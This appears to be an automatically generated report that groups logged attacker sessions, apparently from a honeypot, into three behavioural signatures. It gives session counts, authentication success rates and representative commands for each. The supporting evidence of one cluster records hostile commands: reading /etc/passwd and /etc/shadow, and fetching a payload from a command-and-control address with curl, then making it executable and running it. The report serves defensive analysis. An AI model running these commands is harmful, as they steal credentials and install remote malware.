# Behavioural Signature Generation Report

- Signature schema version: 1.0
- Signatures generated: 3
- Low-confidence signatures: 0

## Signature summary
### sig-fb54a34cea2a64b7 (Command execution)
- Cluster ID: 0
- Supporting sessions: 1 (2.33%)
- Evidence strength: Medium (0.76)
- Command categories: file_system
- Representative commands: cd /tmp
- Authentication profile: {"observed": true, "success_count": 1, "failure_count": 0, "success_rate": 100.0, "notes": "Authentication success/failure observed from session_details.json."}
- Supporting evidence: ["Observed commands: cd /tmp; Command categories: file_system; Authentication success flag: 1; Session duration: 0.680853"]
- Limitations: Small sample size: fewer than two supporting sessions.

### sig-47521826f16efd4b (Mixed/Unclassified)
- Cluster ID: 1
- Supporting sessions: 6 (13.95%)
- Evidence strength: High (0.9)
- Command categories: reconnaissance, file_system, privilege_escalation, credential_attack, file_transfer, networking
- Representative commands: cat /etc/passwd, exit, ls -la, pwd, uname -a
- Authentication profile: {"observed": true, "success_count": 6, "failure_count": 0, "success_rate": 100.0, "notes": "Authentication success/failure observed from session_details.json."}
- Supporting evidence: ["Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 11.224239", "Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 10.762586", "Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 11.383391", "Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 11.278874", "Observed commands: ./payload &, cat /etc/shadow, chmod +x payload, curl http://10.0.0.1/c2_payload > payload, exit; Command categories: file_system, file_transfer, networking, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 21.895156"]
- Limitations: Behavioural interpretation is mixed or weakly supported by the available evidence.

### sig-861aae17eb99f9be (Credential-attack behaviour)
- Cluster ID: 2
- Supporting sessions: 36 (83.72%)
- Evidence strength: High (0.9)
- Command categories: None observed
- Representative commands: None observed
- Authentication profile: {"observed": true, "success_count": 0, "failure_count": 36, "success_rate": 0.0, "notes": "Authentication success/failure observed from session_details.json."}
- Supporting evidence: ["Authentication success flag: 0; Session duration: 3.052236", "Authentication success flag: 0; Session duration: 5.033859", "Authentication success flag: 0; Session duration: 1.024292", "Authentication success flag: 0; Session duration: 5.025731", "Authentication success flag: 0; Session duration: 3.041352"]
- Limitations: No command-category evidence available for this cluster.

